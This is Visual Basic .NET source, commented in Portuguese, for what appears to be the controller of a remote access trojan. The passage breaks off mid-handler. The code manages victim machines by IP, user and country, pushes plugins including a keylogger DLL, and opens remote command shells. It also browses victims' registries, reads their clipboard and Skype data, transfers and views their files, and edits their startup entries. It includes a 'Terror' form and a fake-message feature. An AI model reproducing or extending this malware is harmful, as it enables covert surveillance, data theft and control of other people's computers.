Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.Drawing
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Windows.Forms
Imports System.Windows.Forms.ListView
Imports NotificationWindow

Public Class MdSokserver
    
    Public Shared ensr As Boolean = True
    Public Shared F As FrmMain
    Public Shared hac As Integer = 10
    Public Shared hcam As Integer = 7
    Public Shared hco As Integer = 5
    Public Shared hin As Integer = 4
    Public Shared hip As Integer = 1
    Public Shared hname As Integer = 0
    Public Shared hos As Integer = 6
    Public Shared hpc As Integer = 2
    Public Shared hping As Integer = 9
    Public Shared huser As Integer = 3
    Public Shared hvr As Integer = 8
    Private Shared iNotSad As List(Of MdClient) = New List(Of MdClient)
    Public Shared ISAd As List(Of MdClient) = New List(Of MdClient)
    Public Shared LG As List(Of String) = New List(Of String)
    Public Shared Plug As List(Of plg) = New List(Of plg)
    Public Shared RC As Integer = 0
    Public Shared SNT As Integer = 0
    Public Shared usb As List(Of MdClient) = New List(Of MdClient)
    Public Shared W As MdSK
    Public Shared Y As String = "|Coringa|"


    'FAS PARTE DO REMOTE DESKTOP-01==================================================================================================================================
    Public Shared Function fx(ByVal b As Byte(), ByVal WRD As String) As Array
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Public Shared Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    '=========================================================================================================================================================================









    'VERIFICAR TAMANHO DO ARQUIVO=======================================================================================================================================================
    Public Shared Function SetBytes(Bytes) As String
        On Error GoTo hell
        If Bytes >= 1073741824 Then
            SetBytes = Format(Bytes / 1024 / 1024 / 1024, "#0.00") & " GB"
        ElseIf Bytes >= 1048576 Then
            SetBytes = Format(Bytes / 1024 / 1024, "#0.00") & " MB"
        ElseIf Bytes >= 1024 Then
            SetBytes = Format(Bytes / 1024, "#0.00") & " KB"
        ElseIf Bytes < 1024 Then
            SetBytes = Fix(Bytes) & " KB"
        End If
        Exit Function
hell:
        SetBytes = "0,00 KB"
    End Function
    '===========================================================================================================================================================================





















    Public Shared Function GETPLG(Optional ByVal Name As String = Nothing, Optional ByVal Hash As String = Nothing) As plg
        If (Not Name Is Nothing) Then
            Dim plg2 As plg
            For Each plg2 In MdSokserver.Plug
                If (plg2.Name = Name.ToLower) Then
                    Return plg2
                End If
            Next
        End If
        If (Not Hash Is Nothing) Then
            Dim plg3 As plg
            For Each plg3 In MdSokserver.Plug
                If (plg3.Hash = Hash) Then
                    Return plg3
                End If
            Next
        End If
        Return Nothing
    End Function

    Public Shared Function Gform(ByVal name As String) As Form
        Return Application.OpenForms.Item(name)
    End Function

    Public Shared Function SendPlug(ByVal c As MdClient, ByVal p As plg, ByVal ret As Boolean) As Boolean
        Try
            Dim str As String
            If ret Then
                str = ("ret" & MdSokserver.Y & p.Hash & MdSokserver.Y)
            Else
                str = String.Concat(New String() {"inv", MdSokserver.Y, p.Hash, MdSokserver.Y, c.ip, MdSokserver.Y})
            End If
            Dim stream As New MemoryStream
            If (p.Name = "kl.dll") Then
                str = str.Replace(p.Hash, "kl")
                stream.Write(MdFN.SB(str), 0, str.Length)
                stream.Write(MdFN.SB(p.B), 0, p.B.Length)
            Else
                stream.Write(MdFN.SB(str), 0, str.Length)
                If Not c.plg.Contains(p.Hash) Then
                    stream.Write(MdFN.SB(p.B), 0, p.B.Length)
                Else
                    stream.WriteByte(40)
                End If
            End If
            c.Ping = -9000
            c.Send(stream.ToArray)
            c.Ping = 0
            stream.Dispose()
            Return True
        Catch ex As Exception

        End Try
        Return False
    End Function

    Public Shared Sub SendTo(ByVal O As Object)
        Dim items As SelectedListViewItemCollection = DirectCast(NewLateBinding.LateIndexGet(O, New Object() {0}, Nothing), SelectedListViewItemCollection)
        Try
            Dim enumerator As IEnumerator = Nothing
            Try
                enumerator = items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim objArray2 As Object() = New Object(1 - 1) {}
                    Dim arguments As Object() = New Object(1 - 1) {}
                    Dim num As Integer = 1
                    arguments(0) = num
                    objArray2(0) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(O, arguments, Nothing))
                    Dim objArray3 As Object() = objArray2
                    Dim copyBack As Boolean() = New Boolean() {True}
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", objArray3, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        NewLateBinding.LateIndexSetComplex(O, New Object() {num, RuntimeHelpers.GetObjectValue(objArray3(0))}, Nothing, True, False)
                    End If
                    current.ForeColor = DirectCast(NewLateBinding.LateIndexGet(O, New Object() {2}, Nothing), Color)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        Catch ex As Exception

        End Try
    End Sub

    Public Shared Function vno(ByVal l As ListViewItem) As Object
        Dim obj2 As Object
        Try
            obj2 = String.Concat(New String() {l.Text, "/", l.SubItems.Item(MdSokserver.hpc).Text, "/", l.SubItems.Item(MdSokserver.huser).Text, "/", l.SubItems.Item(MdSokserver.hco).Text, "/", l.SubItems.Item(MdSokserver.hip).Text})
        Catch ex As Exception
            obj2 = "?"
        End Try
        Return obj2
    End Function

    Public Shared Sub Log(ByVal T As String)
        MdSokserver.LG.Add((MdFN.HM & T))
    End Sub

    Delegate Sub _Req(ByVal obj As Object)

    Shared Sub Req(ByVal obj As Object)
        Dim client As MdClient = DirectCast(NewLateBinding.LateIndexGet(obj, New Object() {0}, Nothing), MdClient)
        Dim b As Byte() = DirectCast(NewLateBinding.LateIndexGet(obj, New Object() {1}, Nothing), Byte())
        Dim strArray As String() = Strings.Split(MdFN.BS(b), MdSokserver.Y, -1, CompareMethod.Binary)
        Try
            Dim str5 As String
            Dim bar As ProgressBar
            Dim pr As ToolStripProgressBar
            Dim str4 As String = strArray(0)
            Select Case str4
                Case "get"
                    client.CN = False
                    client.T.Enabled = False
                    Dim up As FrmUpload = DirectCast(MdSokserver.Gform((strArray(1) & strArray(2))), FrmUpload)
                    If (Not up Is Nothing) Then
                        str5 = "ok"
                        client.Client.Client.Send(MdFN.SB(str5), 0, 2, SocketFlags.None)
                        MdSokserver.SNT = (MdSokserver.SNT + 2)
                        Dim num As Integer = 0
                        Try
                            Do While (num <> up.SZ)
                                Dim array As Byte() = New Byte(&H401 - 1) {}
                                Dim num2 As Integer = up.FS.Read(array, 0, array.Length)
                                client.Client.Client.Poll(-1, SelectMode.SelectWrite)
                                client.Client.Client.Send(array, 0, num2, SocketFlags.None)
                                num = (num + num2)
                                MdSokserver.SNT = (MdSokserver.SNT + num2)
                                bar = up.ProgressBar1
                                bar.Value = (bar.Value + num2)
                            Loop
                            up.Close()
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            up.Text = "Connection lost"
                            up.Lv1.ForeColor = Color.Red
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    Return
                Case "post+"
                    Dim dw As New FrmDownload
                    dw.FNNNN = strArray(1)
                    dw.SZ = Conversions.ToInteger(strArray(2))
                    dw.c = client
                    dw.osk = MdSokserver.W.GetClient(strArray(3))
                    dw.Name = (dw.osk.ip & strArray(1))
                    dw.Show()
                    Return


                Case "post"
                    client.CN = False
                    client.T.Enabled = False
                    NewLateBinding.LateIndexSet(obj, New Object() {1, MdFN.SB(String.Concat(New String() {"post+", MdSokserver.Y, strArray(1), MdSokserver.Y, strArray(2), MdSokserver.Y, strArray(3)}))}, Nothing)
                    MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Dim num4 As Integer = 0
                    Do While (MdSokserver.Gform((strArray(3) & strArray(1))) Is Nothing)
                        num4 += 1
                        If (num4 = &H3E8) Then
                            Return
                        End If
                        Thread.Sleep(10)
                    Loop
                    str5 = "ok"
                    client.Client.Client.Send(MdFN.SB(str5), 0, 2, SocketFlags.None)
                    MdSokserver.SNT = (MdSokserver.SNT + 2)
                    Dim buffer As Byte() = New Byte(&H401 - 1) {}
                    Dim dw2 As FrmDownload = DirectCast(MdSokserver.Gform((strArray(3) & strArray(1))), FrmDownload)
                    Dim num3 As Integer = 0
                    Try
Label_034C:
                        If (num3 = dw2.SZ) Then
                            dw2.Button1.Enabled = False
                            dw2.FS.Close()
                            dw2.FS.Dispose()
                            If File.Exists(dw2.folder) Then
                                File.Delete(dw2.folder)
                            End If
                            File.Move(dw2.tmp, dw2.folder)
                            dw2.Close()
                        Else
                            client.Client.Client.Poll(-1, SelectMode.SelectRead)
                            client.Client.Client.Poll(-1, SelectMode.SelectWrite)
                            If (client.Client.Available > 0) Then
                                buffer = New Byte((client.Client.Available + 1) - 1) {}
                                Dim count As Integer = client.Client.Client.Receive(buffer, 0, buffer.Length, SocketFlags.None)
                                dw2.FS.Write(buffer, 0, count)
                                MdSokserver.RC = (MdSokserver.RC + count)
                                num3 = (num3 + count)
                                bar = dw2.ProgressBar1
                                bar.Value = (bar.Value + count)
                                dw2.FS.Flush()
                            Else
                                client.Client.GetStream.WriteByte(0)
                                client.Client.GetStream.Flush()
                                MdSokserver.SNT += 1
                            End If
                            Thread.Sleep(1)
                            GoTo Label_034C
                        End If
                    Catch exception18 As Exception
                        ProjectData.SetProjectError(exception18)
                        Dim exception2 As Exception = exception18
                        dw2.Text = "connection lost"
                        dw2.ForeColor = Color.Red
                        ProjectData.ClearProjectError()
                    End Try
                    Return
                Case "us"
                    client.IsUSB = True
                    client.L.ForeColor = Color.Blue
                    Dim usb As List(Of MdClient) = MdSokserver.usb
                    SyncLock usb
                        MdSokserver.usb.Add(client)
                        Return
                    End SyncLock
                    Exit Select
                Case "RG"
                    Dim reg As FrmRegedit = DirectCast(MdSokserver.Gform(("reg" & client.ip)), FrmRegedit)
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Else
                        Select Case strArray(1)
                            Case "~"
                                reg.RGk.Enabled = True
                                reg.RGLIST.Enabled = True
                                reg.RGk.SelectedNode.Nodes.Clear()
                                reg.RGLIST.Items.Clear()
                                reg.pr.Value = 0
                                reg.pr.Maximum = (strArray.Length - 3)
                                Dim num20 As Integer = (strArray.Length - 1)
                                Dim i As Integer = 3
                                Do While (i <= num20)
                                    Try
                                        pr = reg.pr
                                        pr.Value += 1
                                        If (strArray(i).Length > 0) Then
                                            If strArray(i).Contains("/") Then
                                                Dim strArray2 As String() = Strings.Split(strArray(i), "/", -1, CompareMethod.Binary)
                                                Dim item As ListViewItem = reg.RGLIST.Items.Add(strArray2(0))
                                                item.SubItems.Add(strArray2(1))
                                                Try
                                                    item.SubItems.Add(strArray2(2))
                                                Catch exception19 As Exception
                                                    ProjectData.SetProjectError(exception19)
                                                    Dim exception3 As Exception = exception19
                                                    ProjectData.ClearProjectError()
                                                End Try
                                                If (strArray2(1) = "String") Then
                                                    item.ImageIndex = 1
                                                Else
                                                    item.ImageIndex = 2
                                                End If
                                            Else
                                                reg.RGk.SelectedNode.Nodes.Add(strArray(i))
                                            End If
                                        End If
                                    Catch exception20 As Exception
                                        ProjectData.SetProjectError(exception20)
                                        Dim exception4 As Exception = exception20
                                        ProjectData.ClearProjectError()
                                    End Try
                                    i += 1
                                Loop
                                reg.RGk.SelectedNode.Expand()
                                reg.RGk.Select()
                                reg.RGk.Focus()
                                Dim num21 As Integer = (reg.RGLIST.Columns.Count - 1)
                                Dim j As Integer = 0
                                Do While (j <= num21)
                                    reg.RGLIST.Columns.Item(j).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                                    j += 1
                                Loop
                                reg.pr.Value = 0
                                Exit Select
                        End Select
                    End If
                    Return


                Case "rss"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("sh" & client.ip)), FrmCMDd) Is Nothing) Then
                        Dim shl As New FrmCMDd
                        shl.Name = ("sh" & client.ip)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return

                Case "rs"
                    Dim shl2 As FrmCMDd = DirectCast(MdSokserver.Gform(("sh" & client.ip)), FrmCMDd)
                    If (Not shl2 Is Nothing) Then
                        Dim box As RichTextBox = shl2.T1
                        SyncLock box
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.AppendText((MdFN.DEB(strArray(1).Replace(ChrW(13) & ChrW(10), "")) & ChrW(13) & ChrW(10)))
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.ScrollToCaret()
                        End SyncLock
                    End If
                    Return

















                    'CLIPBOARD=============================================================================================================================================================================================================
                Case "FormClipboard"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("Cliosbd" & client.ip)), FrmClipboard) Is Nothing) Then
                        Dim shl As New FrmClipboard
                        shl.Name = ("Cliosbd" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return

                Case "TextoClipboard"
                    Dim shl2 As FrmClipboard = DirectCast(MdSokserver.Gform(("Cliosbd" & client.ip)), FrmClipboard)
                    If (Not shl2 Is Nothing) Then
                        Try
                            shl2.txtGetClipboard.Text = strArray(1)
                        Catch ex As Exception

                        End Try
                    End If
                    Return
                    '=====================================================================================================================================================================================















                    'SKYPE=============================================================================================================================================================================================================
                Case "ChamaFormSkypeee"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("Skkrypekf" & client.ip)), FrmSkype) Is Nothing) Then
                        Dim shl As New FrmSkype
                        shl.Name = ("Skkrypekf" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return

                Case "MinhasInformsSkypesss"
                    Dim shl2 As FrmSkype = DirectCast(MdSokserver.Gform(("Skkrypekf" & client.ip)), FrmSkype)
                    If (Not shl2 Is Nothing) Then
                        'Try
                        '    shl2.txtGetClipboard.Text = strArray(1)
                        'Catch ex As Exception

                        'End Try
                    End If
                    Return
                    '=====================================================================================================================================================================================

























                    'TERROR===========================================================================================================================================================================================================================================
                Case "ChamaFrmTerrorrr"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("Terrissssd" & client.ip)), FrmTerror) Is Nothing) Then
                        Dim shl As New FrmTerror
                        shl.Name = ("Terrissssd" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return
                    '============================================================================================================================================================================================================================================














                    'STARTUP MANAGER===========================================================================================================================================================================================================================================
                Case "ChamaFrmStartUpsss"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("Startttts" & client.ip)), FrmStartUp) Is Nothing) Then
                        Dim shl As New FrmStartUp
                        shl.Name = ("Startttts" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return

                Case "EnviarStartupDadoss"
                    Dim shl2 As FrmStartUp = DirectCast(MdSokserver.Gform(("Startttts" & client.ip)), FrmStartUp)
                    If (Not shl2 Is Nothing) Then

                        Try

                            shl2.ListView1.Items.Clear()
                            Dim allProcess As String() = Split(strArray(1), vbNewLine)
                            For Each x In allProcess

                                'CURRENT_USER
                                If x.StartsWith("%CU_RUN%") = True Then
                                    Dim xx As String() = Split(x, ".|.")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(1)
                                    itm.SubItems.Add(xx(2))
                                    itm.ImageIndex = 0
                                    itm.Group = shl2.ListView1.Groups("Group1")
                                    shl2.ListView1.Items.Add(itm)

                                    shl2.lbStatus.Text = "Status : Verificando Aguarde (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                                ElseIf x.StartsWith("%CU_ONCE%") = True Then
                                    Dim xx As String() = Split(x, ".|.")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(1)
                                    itm.SubItems.Add(xx(2))
                                    itm.ImageIndex = 0
                                    itm.Group = shl2.ListView1.Groups("Group2")
                                    shl2.ListView1.Items.Add(itm)

                                    shl2.lbStatus.Text = "Status : Verificando Aguarde (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                                ElseIf x.StartsWith("%CU_EXPLO%") = True Then
                                    Dim xx As String() = Split(x, ".|.")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(1)
                                    itm.SubItems.Add(xx(2))
                                    itm.ImageIndex = 0
                                    itm.Group = shl2.ListView1.Groups("Group3")
                                    shl2.ListView1.Items.Add(itm)

                                    shl2.lbStatus.Text = "Status : Verificando Aguarde (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                                    'LOCAL_MACHINE
                                ElseIf x.StartsWith("%MA_RUN%") = True Then
                                    Dim xx As String() = Split(x, ".|.")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(1)
                                    itm.SubItems.Add(xx(2))
                                    itm.ImageIndex = 0
                                    itm.Group = shl2.ListView1.Groups("Group4")
                                    shl2.ListView1.Items.Add(itm)

                                    shl2.lbStatus.Text = "Status : Verificando Aguarde (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                                ElseIf x.StartsWith("%MA_ONCE%") = True Then
                                    Dim xx As String() = Split(x, ".|.")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(1)
                                    itm.SubItems.Add(xx(2))
                                    itm.ImageIndex = 0
                                    itm.Group = shl2.ListView1.Groups("Group5")
                                    shl2.ListView1.Items.Add(itm)

                                    shl2.lbStatus.Text = "Status : Verificando Aguarde (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                                ElseIf x.StartsWith("%MA_EXPLO%") = True Then
                                    Dim xx As String() = Split(x, ".|.")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(1)
                                    itm.SubItems.Add(xx(2))
                                    itm.ImageIndex = 0
                                    itm.Group = shl2.ListView1.Groups("Group6")
                                    shl2.ListView1.Items.Add(itm)

                                    shl2.lbStatus.Text = "Status : Verificando Aguarde (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                                    'STARTUP
                                ElseIf x.StartsWith("%FOLD_UP%") = True Then

                                    Dim xx As String() = Split(x, ".|.")
                                    Dim itmm As New ListViewItem
                                    itmm.Text = xx(1)
                                    itmm.SubItems.Add(xx(2))
                                    If itmm.Text = "desktop.ini" Then
                                        itmm.ImageIndex = 2
                                    Else
                                        itmm.ImageIndex = 1
                                    End If
                                    itmm.Group = shl2.ListView1.Groups("Group7")
                                    shl2.ListView1.Items.Add(itmm)

                                    shl2.lbStatus.Text = "Status : Verificando Aguarde (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                                End If
                            Next

                            shl2.lbStatus.Text = "Status : StartUp (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                        Catch ex As Exception

                        End Try

                    End If
                    Return
                    '=================================================================================================================================================================================


















                    'GERENCIADOR DE ARQUIVOS "BASICO"==============================================================================================================================================================================================================================================================
                Case "ChamaFrmGerenciadorr"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("MineGeenns" & client.ip)), FrmMineGerenciadorArquivos) Is Nothing) Then
                        Dim shl As New FrmMineGerenciadorArquivos
                        shl.Name = ("MineGeenns" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return

                Case "EnviarResultadoGerenciadorrr"
                    Dim shl2 As FrmMineGerenciadorArquivos = DirectCast(MdSokserver.Gform(("MineGeenns" & client.ip)), FrmMineGerenciadorArquivos)
                    If (Not shl2 Is Nothing) Then

                        Try

                            shl2.ListView1.Items.Clear()
                            shl2.lbCaminho.Text = strArray(2)
                            Dim allProcess As String() = Split(strArray(1), vbNewLine)
                            shl2.ProgressBar1.Maximum = (allProcess.Length - 1)
                            For Each x In allProcess
                                If x.StartsWith("%DIRET%") = True Then
                                    Dim xx As String() = Split(x, "%|%")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(1)
                                    itm.ImageIndex = 0
                                    shl2.ListView1.Items.Add(itm)

                                    shl2.ProgressBar1.Value = shl2.ListView1.Items.Count
                                    shl2.lbArquivos.Text = "Arquivos : (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"
                                ElseIf x.StartsWith("%FILESS%") = True Then
                                    Dim xx As String() = Split(x, "%|%")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(1)
                                    itm.SubItems.Add(SetBytes(xx(2)))
                                    If itm.Text.EndsWith(".rar") Or itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".RAR") Or itm.Text.EndsWith(".ZIP") Then
                                        itm.ImageIndex = 1
                                    ElseIf itm.Text.EndsWith(".txt") Or itm.Text.EndsWith(".sed") Or itm.Text.EndsWith(".TXT") Or itm.Text.EndsWith(".SED") Then
                                        itm.ImageIndex = 2
                                    ElseIf itm.Text.EndsWith(".psd") Or itm.Text.EndsWith(".PSD") Then
                                        itm.ImageIndex = 3
                                    ElseIf itm.Text.EndsWith(".lnk") Or itm.Text.EndsWith(".LNK") Then
                                        itm.ImageIndex = 4
                                    ElseIf itm.Text.EndsWith(".dll") Or itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".DLL") Or itm.Text.EndsWith(".SYS") Then
                                        itm.ImageIndex = 5
                                    ElseIf itm.Text.EndsWith(".ini") Or itm.Text.EndsWith(".inf") Or itm.Text.EndsWith(".INI") Or itm.Text.EndsWith(".INF") Then
                                        itm.ImageIndex = 7
                                    ElseIf itm.Text.EndsWith(".suo") Or itm.Text.EndsWith(".SUO") Then
                                        itm.ImageIndex = 8
                                    ElseIf itm.Text.EndsWith(".vb") Or itm.Text.EndsWith(".VB") Then
                                        itm.ImageIndex = 9
                                    ElseIf itm.Text.EndsWith(".sln") Or itm.Text.EndsWith(".SLN") Then
                                        itm.ImageIndex = 10
                                    ElseIf itm.Text.EndsWith(".exe") Or itm.Text.EndsWith(".msi") Or itm.Text.EndsWith(".EXE") Or itm.Text.EndsWith(".MSI") Then
                                        itm.ImageIndex = 11
                                    ElseIf itm.Text.EndsWith(".bat") Or itm.Text.EndsWith(".BAT") Then
                                        itm.ImageIndex = 12
                                    ElseIf itm.Text.EndsWith(".bmp") Or itm.Text.EndsWith(".BMP") Then
                                        itm.ImageIndex = 13
                                    ElseIf itm.Text.EndsWith(".mp3") Or itm.Text.EndsWith(".MP3") Then
                                        itm.ImageIndex = 14
                                    ElseIf itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".docx") Or itm.Text.EndsWith(".RTF") Or itm.Text.EndsWith(".DOCX") Then
                                        itm.ImageIndex = 15
                                    ElseIf itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".GIF") Then
                                        itm.ImageIndex = 16
                                    ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".JPG") Or itm.Text.EndsWith(".JPEG") Then
                                        itm.ImageIndex = 17
                                    ElseIf itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".PNG") Then
                                        itm.ImageIndex = 18
                                    ElseIf itm.Text.EndsWith(".mp4") Or itm.Text.EndsWith(".3gp") Or itm.Text.EndsWith(".wmv") Or itm.Text.EndsWith(".mov") Or itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".m4v") Or itm.Text.EndsWith(".MP4") Or itm.Text.EndsWith(".3GP") Or itm.Text.EndsWith(".WMV") Or itm.Text.EndsWith(".MOV") Or itm.Text.EndsWith(".AVI") Or itm.Text.EndsWith(".M4V") Then
                                        itm.ImageIndex = 19
                                    ElseIf itm.Text.EndsWith(".camproj") Or itm.Text.EndsWith(".CAMPROJ") Then
                                        itm.ImageIndex = 20
                                    ElseIf itm.Text.EndsWith(".camrec") Or itm.Text.EndsWith(".CAMREC") Then
                                        itm.ImageIndex = 21



                                    Else
                                        itm.ImageIndex = 22
                                    End If

                                    shl2.ListView1.Items.Add(itm)

                                    shl2.ProgressBar1.Value = shl2.ListView1.Items.Count
                                    shl2.lbArquivos.Text = "Arquivos : (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                                ElseIf x.StartsWith("%DIISC%") = True Then
                                    Dim xx As String() = Split(x, "%|%")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(1)
                                    itm.SubItems.Add(SetBytes(xx(2)))
                                    itm.ImageIndex = 6
                                    shl2.ListView1.Items.Add(itm)

                                    shl2.ProgressBar1.Value = shl2.ListView1.Items.Count
                                    shl2.lbArquivos.Text = "Discos : (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                                End If
                            Next

                        Catch ex As Exception

                        End Try

                    End If
                    Return

                Case "ChamaFrmVisualizar"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("Visu" & TimeOfDay.ToLongTimeString.ToString.Replace(":", "") & client.ip)), FrmVisualizar) Is Nothing) Then
                        Dim shl As New FrmVisualizar
                        shl.Name = ("Visu" & TimeOfDay.ToLongTimeString.ToString.Replace(":", "") & client.ip)
                        shl.Text = shl.Text ' & " : " & strArray(1)
                        Dim by As Byte() = Nothing
                        by = ZIP(Convert.FromBase64String(strArray(1)), False)
                        Dim ms As New MemoryStream(by)
                        shl.PicVisualizar.Image = Image.FromStream(ms)
                        shl.Show()
                    End If
                    Return


                Case "EnviarBaixaArquivoG"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("Downss" & TimeOfDay.ToLongTimeString.ToString.Replace(":", "") & client.ip)), FrmDownloadMine) Is Nothing) Then
                        Dim shl As New FrmDownloadMine
                        shl.Name = ("Downss" & TimeOfDay.ToLongTimeString.ToString.Replace(":", "") & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.NomeDoArquivo = strArray(3) 'NOME
                        shl.ListView1.Items(0).SubItems(1).Text = strArray(3) 'NOME
                        shl.ListView1.Items(1).SubItems(1).Text = SetBytes(strArray(4)) 'TAMANHO
                        shl.ListView1.Items(2).SubItems(1).Text = strArray(6) 'BASE64
                        shl.ListView1.Items(3).SubItems(1).Text = strArray(5) 'LOCAL
                        shl.Show()
                    End If
                    Return

                    '===================================================================================================================================================================================================































































                    'GERENCIADOR DE JANELAS===========================================================================================================================================================================================================================================
                Case "EnviarPermitirForm"
                    If MdSokserver.F.InvokeRequired Then
                        MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(MdSokserver.Gform(("JANELLLLLL" & client.ip)), FrmJanelas) Is Nothing) Then
                        Dim shl As New FrmJanelas
                        shl.Name = ("JANELLLLLL" & client.ip)
                        shl.Text = shl.Text & " : " & strArray(1)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return

                Case "EnviarPermitirFormJanelas"
                    Dim shl2 As FrmJanelas = DirectCast(MdSokserver.Gform(("JANELLLLLL" & client.ip)), FrmJanelas)
                    If (Not shl2 Is Nothing) Then

                        Try

                            shl2.ListView1.Items.Clear()
                            Dim allProcess As String() = Split(strArray(1), vbNewLine)
                            For Each x In allProcess
                                If Not x = "" Then
                                    Dim xx As String() = Split(x, "%|%")
                                    Dim itm As New ListViewItem
                                    itm.Text = xx(0)
                                    itm.SubItems.Add(xx(1))
                                    itm.ImageIndex = 0
                                    shl2.ListView1.Items.Add(itm)

                                    shl2.lbStatus.Text = "Status : Verificando Aguarde (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"
                                End If
                            Next
                            shl2.lbStatus.Text = "Status : Janelas (" & shl2.ListView1.Items.Count & "/" & (allProcess.Length - 1) & ")"

                        Catch exception1 As Exception

                        End Try

                    End If
                    Return
                    '=================================================================================================================================================================================









                    'MENSAGEM FAKE===========================================================================================================================================================================================================================================
                Case "ChamaFrmMensagemms"
                    If MdSokserver.F.InvokeRequired Then
